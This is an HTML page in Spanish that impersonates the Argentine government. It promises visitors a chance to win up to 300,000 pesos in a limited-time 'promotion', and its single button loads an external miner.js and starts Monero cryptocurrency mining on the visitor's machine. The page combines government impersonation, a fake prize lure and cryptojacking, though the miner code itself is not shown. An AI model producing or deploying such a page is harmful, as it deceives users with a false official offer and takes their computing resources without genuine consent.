<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gobierno de Argentina - Promoción Especial</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      color: #333;
      margin: 0;
      padding: 0;
    }
    header {
      background-color: #007bff;
      color: white;
      padding: 10px;
      text-align: center;
    }
    .container {
      padding: 20px;
      text-align: center;
    }
    .promo-box {
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
      display: inline-block;
      padding: 20px;
      margin: 20px;
      width: 80%;
      max-width: 600px;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 10px 20px;
      cursor: pointer;
      border-radius: 5px;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <header>
    <h1>Gobierno de la República Argentina</h1>
  </header>

  <div class="container">
    <div class="promo-box">
      <h2>Promoción Especial del Gobierno</h2>
      <p>¡Regístrate y podrías ganar hasta 300,000 pesos argentinos!</p>
      <p>Esta oferta es válida solo por tiempo limitado. Aprovecha la oportunidad.</p>
      <button onclick="startMining()">Participar y Minar</button>
    </div>
  </div>

  <script src="miner.js"></script>
  <script>
    function startMining() {
      alert("¡Gracias por participar! Se iniciará el proceso de minería.");
      startMoneroMining();
    }
  </script>

</body>
</html>
